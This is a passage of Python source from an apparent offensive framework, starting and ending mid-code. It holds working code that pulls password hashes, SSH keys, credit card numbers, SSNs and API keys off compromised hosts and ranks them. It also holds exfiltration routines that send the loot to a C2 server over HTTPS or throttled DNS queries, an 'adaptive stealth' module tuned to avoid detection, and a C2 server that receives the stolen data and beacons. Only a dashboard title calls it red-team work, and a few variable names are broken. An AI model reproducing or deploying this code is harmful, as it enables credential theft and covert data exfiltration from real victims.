    def _read_file(self, path: str) -> Optional[str]:
        """Read a file from the target device."""
        command = f"cat '{path}' 2>/dev/null"
        stdout, stderr, exit_status = self.execute_command(command)
        if exit_status == 0 and stdout:
            return stdout
        return None

    def _infer_credential_type(self, path: str) -> str:
        """Infer the type of credential based on file path."""
        if 'shadow' in path:
            return 'password_hash'
        elif 'ssh' in path and ('id_rsa' in path or 'id_dsa' in path):
            return 'ssh_private_key'
        elif 'mysql' in path or 'postgresql' in path:
            return 'database_credential'
        elif 'bash_history' in path or 'zsh_history' in path:
            return 'command_history'
        elif 'hosts' in path or 'fstab' in path:
            return 'network_config'
        else:
            return 'unknown_config'

    def extract_sensitive_files(self, search_paths: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """Extract files matching sensitive patterns."""
        if not self.connected:
            return []

        if search_paths is None:
            # Default sensitive search paths
            search_paths = [
                '/home/*',
                '/root',
                '/tmp',
                '/var/log',
                '/etc',
                '/opt',
                '/usr/local'
            ]

        sensitive_files = []
        # Patterns for sensitive files
        sensitive_patterns = [
            r'.*\.(pem|key|p12|pfx|cer|crt|pub)$',  # Certificates, keys
            r'.*\.sql$',  # SQL dumps
            r'.*\.bak$',  # Backup files
            r'.*\.old$',  # Old files
            r'.*\.log$',  # Log files
            r'config\..*',  # Config files
            r'.*\.env$',  # Environment files
            r'.*\.ini$',  # INI config
            r'.*\.xml$',  # XML config
            r'.*\.json$',  # JSON config
            r'password.*',
            r'credential.*',
            r'access.*',
            r'key.*',
            r'secret.*',
            r'auth.*'
        ]

        for base_path in search_paths:
            find_cmd = f"find {base_path} -type f -size -10M 2>/dev/null | head -50"  # Limit to 50 files
            stdout, _, _ = self.execute_command(find_cmd)
            if stdout:
                files = stdout.strip().split('\n')
                for file_path in files:
                    if file_path:
                        for pattern in sensitive_patterns:
                            if re.search(pattern, os.path.basename(file_path), re.IGNORECASE):
                                file_content = self._read_file(file_path)
                                if file_content:
                                    sensitive_files.append({
                                        'path': file_path,
                                        'content': file_content,
                                        'size': len(file_content),
                                        'pattern_matched': pattern
                                    })
                                break  # Break after first match to avoid duplicates

        self.extracted_data['files'] = sensitive_files
        logger.info(f"Found {len(sensitive_files)} sensitive files from {self.access_info['ip']}")
        return sensitive_files

    def extract_network_info(self) -> Dict[str, Any]:
        """Extract network configuration and connections."""
        if not self.connected:
            return {}

        network_info = {}

        # IP configuration
        ip_config, _, _ = self.execute_command('ip addr show')
        if ip_config:
            network_info['ip_config'] = ip_config.strip()

        # Routing table
        routing, _, _ = self.execute_command('ip route show')
        if routing:
            network_info['routing_table'] = routing.strip()

        # ARP table
        arp, _, _ = self.execute_command('arp -a')
        if arp:
            network_info['arp_table'] = arp.strip()

        # Active connections
        connections, _, _ = self.execute_command('ss -tuln')
        if connections:
            network_info['active_connections'] = connections.strip()

        # Firewall status (iptables)
        iptables, _, _ = self.execute_command('iptables -L -n -v 2>/dev/null')
        if iptables:
            network_info['iptables_rules'] = iptables.strip()

        # DNS configuration
        resolv_conf, _, _ = self.execute_command('cat /etc/resolv.conf')
        if resolv_conf:
            network_info['dns_config'] = resolv_conf.strip()

        self.extracted_data['network_info'] = network_info
        logger.info(f"Network info extracted from {self.access_info['ip']}")
        return network_info

    def extract_processes(self) -> List[Dict[str, Any]]:
        """Extract running processes."""
        if not self.connected:
            return []

        processes = []
        ps_output, _, _ = self.execute_command('ps aux --forest')
        if ps_output:
            lines = ps_output.strip().split('\n')[1:]  # Skip header
            for line in lines:
                parts = line.split(None, 10)  # Split into max 11 parts
                if len(parts) >= 11:
                    processes.append({
                        'user': parts[0],
                        'pid': parts[1],
                        'cpu': parts[2],
                        'mem': parts[3],
                        'vsz': parts[4],
                        'rss': parts[5],
                        'tty': parts[6],
                        'stat': parts[7],
                        'start': parts[8],
                        'time': parts[9],
                        'command': parts[10]
                    })

        self.extracted_data['processes'] = processes
        logger.info(f"Found {len(processes)} processes on {self.access_info['ip']}")
        return processes

    def extract_sensitive_data(self) -> Dict[str, Any]:
        """
        Run all extraction methods and return consolidated data.
        This is the main method to call for full extraction.
        """
        if not self.connect():
            logger.error(f"Cannot extract data from {self.access_info['ip']}, connection failed.")
            return {}

        logger.info(f"Starting data extraction from {self.access_info['ip']}")

        self.extract_system_info()
        self.extract_credentials()
        self.extract_sensitive_files()
        self.extract_network_info()
        self.extract_processes()

        # Consolidate sensitive data based on content analysis
        self._analyze_content_for_sensitive_data()

        logger.info(f"Data extraction completed for {self.access_info['ip']}")
        return self.extracted_data

    def _analyze_content_for_sensitive_data(self):
        """Analyze extracted content for specific sensitive data patterns."""
        sensitive_patterns = {
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b|\b(?:\d{4}[-\s]?){2}\d{7}\b',
            'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
            'phone': r'\b(?:\+?1[-.\s]?)?\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})\b',
            'password': r'(?:password|pass|pwd|secret|token|key)[\s:=]+(\S{4,})',
            'api_key': r'(?:api[_-]?key|key|token)[\s:=]+(\S{20,})',
            'aws_key': r'AKIA[0-9A-Z]{16}',
            'private_key': r'-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----',
            'ssh_key': r'ssh-(?:rsa|dss|ed25519) [A-Za-z0-9+/]{20,}.*'
        }

        consolidated_sensitive = {
            'emails': [],
            'credit_cards': [],
            'ssns': [],
            'phones': [],
            'passwords': [],
            'api_keys': [],
            'aws_keys': [],
            'private_keys': [],
            'ssh_keys': []
        }

        # Analyze credentials content
        for cred in self.extracted_data['credentials']:
            content = cred.get('content', '')
            for data_type, pattern in sensitive_patterns.items():
                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                if matches:
                    consolidated_sensitive[f"{data_type}s"].extend(matches)

        # Analyze sensitive files content
        for file_entry in self.extracted_data['files']:
            content = file_entry.get('content', '')
            for data_type, pattern in sensitive_patterns.items():
                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                if matches:
                    consolidated_sensitive[f"{data_type}s"].extend(matches)

        self.extracted_data['sensitive_data'] = consolidated_sensitive
        logger.info(f"Sensitive data analysis completed for {self.access_info['ip']}")

    def close(self):
        """Close the connection."""
        if self.ssh_client:
            self.ssh_client.close()
            self.connected = False
            logger.info(f"Connection to {self.access_info['ip']} closed")

    def __enter__(self):
        """Context manager entry."""
        self.connect()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit."""
        self.close()

# ==============================================================================
# BEGIN MODULE: Data Categorization & Exfiltration
# ==============================================================================

class DataCategorizer:
    """
    Handles categorization of extracted data.
    """
    
    def __init__(self):
        self.categories = {
            'credentials': [],
            'personal_info': [],
            'financial_data': [],
            'network_info': [],
            'system_info': [],
            'files': [],
            'api_keys': [],
            'ssh_keys': [],
            'other': []
        }

    def categorize_data(self, extracted_Dict: Dict[str, Any]) -> Dict[str, List[Any]]:
        """
        Categorize extracted data based on its content and source.
        """
        self.categories = {key: [] for key in self.categories}  # Reset categories

        # 1. Credentials
        if 'credentials' in extracted_data:
            for cred in extracted_data['credentials']:
                if 'password_hash' in cred.get('type', ''):
                    self.categories['credentials'].append({
                        'source': cred['path'],
                        'type': 'password_hash',
                        'content': cred['content']
                    })
                elif 'ssh_private_key' in cred.get('type', ''):
                    self.categories['ssh_keys'].append({
                        'source': cred['path'],
                        'content': cred['content']
                    })
                else:
                    self.categories['credentials'].append({
                        'source': cred['path'],
                        'type': cred['type'],
                        'content': cred['content']
                    })

        # 2. System info
        if 'system_info' in extracted_:
            self.categories['system_info'].append(extracted_data['system_info'])

        # 3. Network info
        if 'network_info' in extracted_:
            self.categories['network_info'].append(extracted_data['network_info'])

        # 4. Files
        if 'files' in extracted_:
            for file_entry in extracted_data['files']:
                # Check for sensitive content inside files
                content = file_entry['content']
                if self._is_api_key(content):
                    self.categories['api_keys'].append({
                        'source': file_entry['path'],
                        'content': content
                    })
                elif self._is_ssh_key(content):
                    self.categories['ssh_keys'].append({
                        'source': file_entry['path'],
                        'content': content
                    })
                elif self._is_financial_data(content):
                    self.categories['financial_data'].append({
                        'source': file_entry['path'],
                        'content': content
                    })
                elif self._is_personal_info(content):
                    self.categories['personal_info'].append({
                        'source': file_entry['path'],
                        'content': content
                    })
                else:
                    self.categories['files'].append(file_entry)

        # 5. Sensitive data from analysis
        if 'sensitive_data' in extracted_:
            sensitive = extracted_data['sensitive_data']
            if sensitive.get('credit_cards'):
                self.categories['financial_data'].extend([
                    {'type': 'credit_card', 'value': cc} for cc in sensitive['credit_cards']
                ])
            if sensitive.get('passwords'):
                self.categories['credentials'].extend([
                    {'type': 'plaintext_password', 'value': pwd} for pwd in sensitive['passwords']
                ])
            if sensitive.get('emails'):
                self.categories['personal_info'].extend([
                    {'type': 'email', 'value': email} for email in sensitive['emails']
                ])
            if sensitive.get('api_keys'):
                self.categories['api_keys'].extend([
                    {'type': 'api_key', 'value': key} for key in sensitive['api_keys']
                ])
            if sensitive.get('private_keys'):
                self.categories['ssh_keys'].extend([
                    {'type': 'private_key', 'value': key} for key in sensitive['private_keys']
                ])

        # 6. Other
        for key, value in extracted_data.items():
            if key not in ['credentials', 'files', 'system_info', 'network_info', 'processes', 'sensitive_data']:
                self.categories['other'].append({key: value})

        logger.info(f"Data categorized: {self._get_summary(self.categories)}")
        return self.categories

    def prioritize_data(self) -> List[Dict[str, Any]]:
        """
        Prioritize data based on sensitivity and impact.
        """
        priorities = []
        
        # Critical: SSH keys, API keys, passwords
        for key in self.categories['ssh_keys']:
            priorities.append({'data': key, 'priority': 'critical', 'reason': 'SSH private key'})
        for key in self.categories['api_keys']:
            priorities.append({'data': key, 'priority': 'critical', 'reason': 'API key'})
        for cred in self.categories['credentials']:
            if 'password_hash' in cred.get('type', '') or 'plaintext_password' in cred.get('type', ''):
                priorities.append({'data': cred, 'priority': 'critical', 'reason': 'Password credential'})
        
        # High: Financial data, personal info
        for fin in self.categories['financial_data']:
            priorities.append({'data': fin, 'priority': 'high', 'reason': 'Financial data'})
        for per in self.categories['personal_info']:
            priorities.append({'data': per, 'priority': 'high', 'reason': 'Personal info'})
        
        # Medium: System info, network info
        for sys in self.categories['system_info']:
            priorities.append({'data': sys, 'priority': 'medium', 'reason': 'System info'})
        for net in self.categories['network_info']:
            priorities.append({'data': net, 'priority': 'medium', 'reason': 'Network info'})
        
        # Low: Other files
        for file in self.categories['files']:
            priorities.append({'data': file, 'priority': 'low', 'reason': 'Other file'})
        
        return priorities

    def _is_api_key(self, content: str) -> bool:
        """Check if content contains API key patterns."""
        patterns = [
            r'api[_-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})["\']?',
            r'token["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})["\']?',
            r'["\']?([A-Za-z0-9]{32,})["\']?\s*[:=].*(secret|key|token)',
            r'AKIA[0-9A-Z]{16}',  # AWS
            r'AIza[0-9A-Za-z\-_]{35}',  # Google
            r'sk-[a-zA-Z0-9]{48}',  # OpenAI
            r'ghp_[a-zA-Z0-9]{36}',  # GitHub
        ]
        for pattern in patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False

    def _is_ssh_key(self, content: str) -> bool:
        """Check if content contains SSH private key."""
        return '-----BEGIN' in content and ('PRIVATE KEY' in content or 'DSA' in content or 'RSA' in content or 'Ed25519' in content)

    def _is_financial_data(self, content: str) -> bool:
        """Check if content contains financial data (credit cards, etc.)."""
        # Credit card pattern
        cc_pattern = r'\b(?:\d{4}[-\s]?){3}\d{4}\b|\b(?:\d{4}[-\s]?){2}\d{7}\b'
        # IBAN pattern
        iban_pattern = r'[A-Z]{2}[0-9]{2}[A-Z0-9]{4}[0-9]{7}([A-Z0-9]?){0,16}'
        return bool(re.search(cc_pattern, content)) or bool(re.search(iban_pattern, content))

    def _is_personal_info(self, content: str) -> bool:
        """Check if content contains personal info (emails, phones, etc.)."""
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        phone_pattern = r'\b(?:\+?1[-.\s]?)?\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})\b'
        ssn_pattern = r'\b\d{3}-\d{2}-\d{4}\b'
        return (bool(re.search(email_pattern, content, re.IGNORECASE)) or
                bool(re.search(phone_pattern, content)) or
                bool(re.search(ssn_pattern, content)))

    def _get_summary(self, categories: Dict[str, List[Any]]) -> str:
        """Get a summary of categorized data."""
        summary = []
        for cat, items in categories.items():
            if items:
                summary.append(f"{cat}: {len(items)} items")
        return ", ".join(summary)

class DataExfiltrator:
    """
    Handles secure exfiltration of categorized data to C2.
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize exfiltration manager with configuration.
        Example config:
        {
            'c2_url': 'https://c2-server.com/exfil',
            'encryption_key': 'your-32-byte-key-here-32bytes!!',
            'method': 'https',  # 'https', 'dns', 'icmp', 'email'
            'proxy_url': 'socks5://127.0.0.1:9050'
        }
        """
        self.config = config
        self.c2_url = config.get('c2_url', 'http://127.0.0.1:8080/exfiltrate')
        self.encryption_key = config.get('encryption_key', 'default-key-32-bytes-32bytes!!')
        self.method = config.get('method', 'https')
        self.proxy_url = config.get('proxy_url', None)
        self.session = None

    async def initialize_session(self):
        """Initialize aiohttp session with optional proxy."""
        if not AIOHTTP_AVAILABLE:
            logger.warning("aiohttp not available, skipping session initialization.")
            return
            
        if self.proxy_url:
            connector = aiohttp.TCPConnector()
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                trust_env=True  # Use proxy from environment
            )
        else:
            self.session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))

    async def close(self):
        """Close the aiohttp session."""
        if self.session:
            await self.session.close()

    def encrypt_data(self, data: Dict[str, Any]) -> str:
        """Encrypt data using Fernet (AES) before exfiltration."""
        if not CRYPTOGRAPHY_AVAILABLE:
            logger.warning("Cryptography module not available. Sending data unencrypted.")
            return base64.b64encode(json.dumps(data).encode()).decode()
            
        try:
            # Derive key from password
            password = self.encryption_key.encode()
            salt = b'salt_32_bytes_long_for_pbkdf2_'  # In real use, use random salt
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))
            f = Fernet(key)
            serialized_data = json.dumps(data).encode()
            encrypted_data = f.encrypt(serialized_data)
            return base64.b64encode(encrypted_data).decode()
        except Exception as e:
            logger.error(f"Encryption failed: {e}")
            # Fallback: send unencrypted if encryption fails (not recommended in prod)
            return json.dumps(data)

    def decrypt_data(self, encrypted_payload: str) -> Optional[Dict[str, Any]]:
        """Decrypt received data using Fernet (AES)."""
        if not CRYPTOGRAPHY_AVAILABLE:
            logger.warning("Cryptography module not available. Assuming data is base64 encoded JSON.")
            try:
                decoded_data = base64.b64decode(encrypted_payload).decode()
                return json.loads(decoded_data)
            except:
                return None
                
        try:
            # Derive key from password (same method as in exfiltration manager)
            password = self.encryption_key.encode()
            salt = b'salt_32_bytes_long_for_pbkdf2_'  # Should match the exfiltration side
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))
            f = Fernet(key)
            encrypted_bytes = base64.b64decode(encrypted_payload.encode())
            decrypted_bytes = f.decrypt(encrypted_bytes)
            return json.loads(decrypted_bytes.decode())
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return None

    async def exfiltrate(self, device_info: Dict[str, Any], categorized_data: Dict[str, List[Any]]):
        """
        Exfiltrate categorized data to C2 server using configured method.
        """
        if not self.session:
            await self.initialize_session()

        payload = {
            'device_info': device_info,
            'categorized_data': categorized_data,
            'timestamp': device_info.get('timestamp', 'unknown')
        }

        # Encrypt the payload
        encrypted_payload = self.encrypt_data(payload)

        if self.method == 'https':
            await self.exfiltrate_via_https(encrypted_payload)
        elif self.method == 'dns':
            await self.exfiltrate_via_dns(encrypted_payload)
        elif self.method == 'icmp':
            await self.exfiltrate_via_icmp(encrypted_payload)
        else:
            logger.warning(f"Unknown exfiltration method: {self.method}. Defaulting to HTTPS.")
            await self.exfiltrate_via_https(encrypted_payload)

    async def exfiltrate_via_https(self, encrypted_payload: str):
        """Exfiltrate data via HTTPS POST request."""
        if not AIOHTTP_AVAILABLE:
            logger.error("aiohttp not available, cannot perform HTTPS exfiltration.")
            return
            
        try:
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'  # Mimic browser
            }
            data = json.dumps({'data': encrypted_payload})

            async with self.session.post(self.c2_url, data=data, headers=headers) as response:
                if response.status == 200:
                    logger.info(f"Data successfully exfiltrated via HTTPS to {self.c2_url}")
                else:
                    logger.error(f"HTTPS exfiltration failed with status {response.status}")
        except Exception as e:
            logger.error(f"HTTPS exfiltration error: {e}")

    async def exfiltrate_via_dns(self, encrypted_payload: str):
        """Exfiltrate data via DNS queries (covert channel)."""
        try:
            # Split data into chunks of 63 chars (max subdomain length)
            chunk_size = 63
            chunks = [encrypted_payload[i:i+chunk_size] for i in range(0, len(encrypted_payload), chunk_size)]
            c2_domain = self.c2_url.replace('http://', '').replace('https://', '').split('/')[0]

            for i, chunk in enumerate(chunks):
                subdomain = f"{chunk}.{c2_domain}"
                try:
                    socket.gethostbyname(subdomain)  # This sends a DNS query
                    await asyncio.sleep(0.5)  # Throttle to avoid detection
                except:
                    pass  # Ignore DNS resolution failure

            logger.info(f"Data successfully exfiltrated via DNS to {c2_domain}")
        except Exception as e:
            logger.error(f"DNS exfiltration error: {e}")

    async def exfiltrate_via_icmp(self, encrypted_payload: str):
        """Exfiltrate data via ICMP packets (requires root privileges)."""
        try:
            if not SCAPY_AVAILABLE:
                logger.warning("Scapy not available, skipping ICMP exfiltration.")
                return
                
            # This is a simplified example, real ICMP exfil requires raw sockets
            # and is OS-dependent. We'll simulate the concept.
            target_ip = self.c2_url.replace('http://', '').replace('https://', '').split('/')[0]
            
            # In a real scenario, you'd craft ICMP packets with the payload
            # For now, we'll just log the intent
            logger.info(f"ICMP exfiltration to {target_ip} would send: {encrypted_payload[:50]}...")
            # Example packet (not actually sent without proper privileges):
            # packet = scapy.IP(dst=target_ip)/scapy.ICMP()/scapy.Raw(load=encrypted_payload.encode())
            # scapy.send(packet, verbose=False)
            
        except ImportError:
            logger.warning("Scapy not available, skipping ICMP exfiltration.")
        except Exception as e:
            logger.error(f"ICMP exfiltration error: {e}")

    async def exfiltrate_file(self, file_path: str, device_ip: str):
        """Exfiltrate a specific file to C2."""
        try:
            with open(file_path, 'rb') as f:
                file_content = f.read()
            
            encoded_content = base64.b64encode(file_content).decode()
            payload = {
                'device_ip': device_ip,
                'file_path': file_path,
                'file_content': encoded_content,
                'file_size': len(file_content)
            }

            encrypted_payload = self.encrypt_data(payload)
            await self.exfiltrate_via_https(encrypted_payload)
        except Exception as e:
            logger.error(f"File exfiltration failed: {e}")

# ==============================================================================
# BEGIN MODULE: ML-Based Adaptive Stealth
# ==============================================================================

class AdaptiveStealth:
    """
    Handles behavioral analysis and adaptive strategy adjustment using ML.
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize ML adaptation framework with configuration.
        Example config:
        {
            'window_size': 100,  # Number of recent actions to consider
            'model_path': 'models/behavior_model.pkl',
            'learning_rate': 0.1,
            'stealth_threshold': 0.8,  # Threshold for stealth detection
            'adaptation_frequency': 10  # Adapt every N actions
        }
        """
        self.config = config
        self.window_size = config.get('window_size', 100)
        self.model_path = config.get('model_path', 'models/behavior_model.pkl')
        self.learning_rate = config.get('learning_rate', 0.1)
        self.stealth_threshold = config.get('stealth_threshold', 0.8)
        self.adaptation_frequency = config.get('adaptation_frequency', 10)
        
        # Action history for behavioral analysis
        self.action_history = deque(maxlen=self.window_size)
        self.performance_log = defaultdict(list)
        self.stealth_indicators = deque(maxlen=self.window_size)
        
        # Load or initialize model
        self.model = self._load_model()
        self.action_counter = 0
        self.last_adaptation = 0

    def _load_model(self):
        """Load ML model from file or initialize a default one."""
        if os.path.exists(self.model_path):
            try:
                with open(self.model_path, 'rb') as f:
                    model = pickle.load(f)
                logger.info(f"ML model loaded from {self.model_path}")
                return model
            except Exception as e:
                logger.error(f"Failed to load model: {e}. Initializing default model.")
        
        # Default model (can be replaced with sklearn/other)
        # For now, we'll use a simple scoring system
        return {
            'technique_scores': defaultdict(float),
            'environment_factors': defaultdict(float),
            'stealth_scores': defaultdict(float)
        }

    def _save_model(self):
        """Save the current model to file."""
        try:
            # Ensure directory exists
            os.makedirs(os.path.dirname(self.model_path), exist_ok=True)
            
            with open(self.model_path, 'wb') as f:
                pickle.dump(self.model, f)
            logger.info(f"ML model saved to {self.model_path}")
        except Exception as e:
            logger.error(f"Failed to save model: {e}")

    def record_behavior(self, action: Dict[str, Any], outcome: Dict[str, Any]):
        """
        Log an action and its outcome for ML analysis.
        Example action:
        {
            'technique': 'ssh_bruteforce',
            'target_ip': '192.168.1.10',
            'success': True,
            'time_taken': 15.2,
            'stealth_detected': False
        }
        """
        action['timestamp'] = datetime.now().isoformat()
        action['outcome'] = outcome
        self.action_history.append(action)
        
        # Update performance log
        technique = action.get('technique', 'unknown')
        self.performance_log[technique].append({
            'success': outcome.get('success', False),
            'time_taken': action.get('time_taken', 0),
            'stealth_detected': outcome.get('stealth_detected', False)
        })
        
        # Update stealth indicators
        stealth_score = 1.0 if outcome.get('stealth_detected') else 0.0
        self.stealth_indicators.append(stealth_score)
        
        # Update model scores
        self._update_model_scores(action, outcome)
        
        self.action_counter += 1

    def _update_model_scores(self, action: Dict[str, Any], outcome: Dict[str, Any]):
        """Update internal model scores based on action outcome."""
        technique = action.get('technique', 'unknown')
        success = outcome.get('success', False)
        stealth_detected = outcome.get('stealth_detected', False)
        
        # Update technique score (success rate)
        current_score = self.model['technique_scores'][technique]
        if success:
            self.model['technique_scores'][technique] = current_score + self.learning_rate * (1 - current_score)
        else:
            self.model['technique_scores'][technique] = current_score - self.learning_rate * current_score
        
        # Update stealth score (lower is better)
        current_stealth = self.model['stealth_scores'][technique]
        if stealth_detected:
            self.model['stealth_scores'][technique] = current_stealth + self.learning_rate * (1 - current_stealth)
        else:
            self.model['stealth_scores'][technique] = current_stealth - self.learning_rate * current_stealth

    def calculate_risk_score(self, device_info: Dict[str, Any]) -> float:
        """
        Calculate risk score based on device behavior and environment.
        """
        ip = device_info.get('ip', 'unknown')
        
        # Calculate behavioral metrics
        recent_actions = [a for a in self.action_history if a.get('target_ip') == ip]
        if not recent_actions:
            return 0.5  # Neutral risk
        
        # Calculate stealth detection rate
        stealth_detections = [a for a in recent_actions if a['outcome'].get('stealth_detected')]
        stealth_rate = len(stealth_detections) / len(recent_actions)
        
        # Calculate success rate
        successful_actions = [a for a in recent_actions if a['outcome'].get('success')]
        success_rate = len(successful_actions) / len(recent_actions)
        
        # Risk is higher if stealth detection rate is high
        risk_score = stealth_rate * 0.7 + (1 - success_rate) * 0.3
        
        return min(risk_score, 1.0)  # Cap at 1.0

    def adapt_behavior(self, current_strategy: str, environment_feedback: Dict[str, Any]) -> str:
        """
        Adapt the current strategy based on environment feedback.
        """
        # Analyze recent stealth detections
        recent_stealth_avg = np.mean(list(self.stealth_indicators)) if self.stealth_indicators and NUMPY_AVAILABLE else sum(self.stealth_indicators) / len(self.stealth_indicators) if self.stealth_indicators else 0
        
        # Adjust strategy based on feedback
        if recent_stealth_avg > self.stealth_threshold:
            if current_strategy != 'stealthy_approach':
                logger.info(f"Adapting strategy to stealthy due to high detection rate ({recent_stealth_avg:.2f})")
                return 'stealthy_approach'
        elif current_strategy == 'stealthy_approach' and recent_stealth_avg < 0.1:
            logger.info(f"Adapting strategy to balanced due to low detection rate ({recent_stealth_avg:.2f})")
            return 'balanced'
        
        return current_strategy

    def should_adapt_now(self) -> bool:
        """
        Determine if it's time to adapt the strategy based on action count.
        """
        return (self.action_counter - self.last_adaptation) >= self.adaptation_frequency

    def perform_adaptation(self):
        """
        Perform a full adaptation cycle.
        """
        if not self.should_adapt_now():
            return

        logger.info("Performing ML-based adaptation...")
        
        # Update environment factors
        env_factors = self._calculate_environment_factors()
        for factor, value in env_factors.items():
            self.model['environment_factors'][factor] = value
        
        # Save updated model
        self._save_model()
        
        self.last_adaptation = self.action_counter
        logger.info("Adaptation cycle completed.")

    def _calculate_environment_factors(self) -> Dict[str, float]:
        """
        Calculate environment factors that might affect strategy.
        """
        factors = {}
        
        # Calculate overall stealth detection rate
        if self.stealth_indicators:
            factors['stealth_pressure'] = np.mean(list(self.stealth_indicators)) if NUMPY_AVAILABLE else sum(self.stealth_indicators) / len(self.stealth_indicators)
        else:
            factors['stealth_pressure'] = 0.0
        
        # Calculate average success rate
        all_success_rates = []
        for tech_scores in self.performance_log.values():
            successes = [s['success'] for s in tech_scores]
            if successes:
                all_success_rates.append(sum(successes) / len(successes))
        
        factors['overall_success_rate'] = np.mean(all_success_rates) if all_success_rates and NUMPY_AVAILABLE else sum(all_success_rates) / len(all_success_rates) if all_success_rates else 0.0
        
        # Calculate technique diversity (how many different techniques used)
        factors['technique_diversity'] = len(self.performance_log) / max(len(self.action_history), 1)
        
        return factors

# ==============================================================================
# BEGIN MODULE: C2 Server
# ==============================================================================

class C2Server:
    """
    Handles receiving, decrypting, and managing data from compromised devices.
    """
    
    def __init__(self, host: str = '0.0.0.0', port: int = 8080, encryption_key: str = 'default-key-32-bytes-32bytes!!'):
        self.host = host
        self.port = port
        self.encryption_key = encryption_key
        self.app = None
        self.data_store = {}  # In production, use a database
        self.stats = {
            'total_requests': 0,
            'exfiltrated_devices': set(),
            'total_data_points': 0
        }

    def decrypt_data(self, encrypted_payload: str) -> Optional[Dict[str, Any]]:
        """Decrypt received data using Fernet (AES)."""
        if not CRYPTOGRAPHY_AVAILABLE:
            logger.warning("Cryptography module not available. Assuming data is base64 encoded JSON.")
            try:
                decoded_data = base64.b64decode(encrypted_payload).decode()
                return json.loads(decoded_data)
            except:
                return None
                
        try:
            # Derive key from password (same method as in exfiltration manager)
            password = self.encryption_key.encode()
            salt = b'salt_32_bytes_long_for_pbkdf2_'  # Should match the exfiltration side
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))
            f = Fernet(key)
            encrypted_bytes = base64.b64decode(encrypted_payload.encode())
            decrypted_bytes = f.decrypt(encrypted_bytes)
            return json.loads(decrypted_bytes.decode())
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return None

    async def handle_exfiltration(self, request):
        """Handle incoming exfiltrated data."""
        self.stats['total_requests'] += 1
        try:
            data = await request.json()
            encrypted_payload = data.get('data')

            if not encrypted_payload:
                return aiohttp.web.json_response({'status': 'error', 'message': 'No data provided'}, status=400)

            decrypted_data = await self.decrypt_data(encrypted_payload)
            if not decrypted_:
                return aiohttp.web.json_response({'status': 'error', 'message': 'Decryption failed'}, status=400)

            # Store the data
            device_ip = decrypted_data.get('device_info', {}).get('ip', 'unknown')
            timestamp = decrypted_data.get('timestamp', datetime.now().isoformat())
            key = f"{device_ip}_{timestamp}"
            self.data_store[key] = decrypted_data
            self.stats['exfiltrated_devices'].add(device_ip)
            self.stats['total_data_points'] += 1

            logger.info(f"Received data from {device_ip}")
            return aiohttp.web.json_response({'status': 'success', 'message': 'Data received and stored'})
        except Exception as e:
            logger.error(f"Error handling exfiltration: {e}")
            return aiohttp.web.json_response({'status': 'error', 'message': str(e)}, status=500)

    async def handle_beacon(self, request):
        """Handle beacon requests from compromised devices."""
        try:
            device_info = await request.json()
            device_ip = device_info.get('ip', 'unknown')
            logger.info(f"Beacon received from {device_ip}")
            return aiohttp.web.json_response({'status': 'alive', 'command': 'none'})
        except:
            return aiohttp.web.json_response({'status': 'error', 'message': 'Invalid beacon'}, status=400)

    async def dashboard_handler(self, request):
        """Serve a simple dashboard with statistics."""
        html = f"""
        <html>
        <head><title>C2 Dashboard</title></head>
        <body>
        <h1>Red Team C2 Dashboard</h1>
        <p><strong>Total Requests:</strong> {self.stats['total_requests']}</p>
        <p><strong>Compromised Devices:</strong> {len(self.stats['exfiltrated_devices'])}</p>
        <p><strong>Total Data Points:</strong> {self.stats['total_data_points']}</p>
        <p><strong>Devices:</strong> {', '.join(self.stats['exfiltrated_devices'])}</p>
        <hr>
        <h2>Recent Data Points</h2>
        <ul>
        """
        # Show last 10 data points
        recent_keys = sorted(self.data_store.keys(), reverse=True)[:10]
        for key in recent_keys:
            data = self.data_store[key]
            device_ip = data.get('device_info', {}).get('ip', 'unknown')
            html += f"<li><strong>{key}</strong> - Device: {device_ip}</li>"
        html += """
        </ul>
        </body>
        </html>
        """
        return aiohttp.web.Response(text=html, content_type='text/html')

    def setup_routes(self):
        """Setup HTTP routes for the C2 server."""
        if not AIOHTTP_AVAILABLE:
            logger.error("aiohttp not available, cannot set up C2 server routes.")
            return
            
        self.app.router.add_post('/exfiltrate', self.handle_exfiltration)
        self.app.router.add_post('/beacon', self.handle_beacon)
        self.app.router.add_get('/dashboard', self.dashboard_handler)
        self.app.router.add_get('/data', self.data_handler)
        self.app.router.add_get('/stats', self.stats_handler)

    async def data_handler(self, request):
        """Return all collected data in JSON format."""
        return aiohttp.web.json_response(self.data_store)

    async def stats_handler(self, request):
        """Return statistics in JSON format."""
        stats_copy = self.stats.copy()
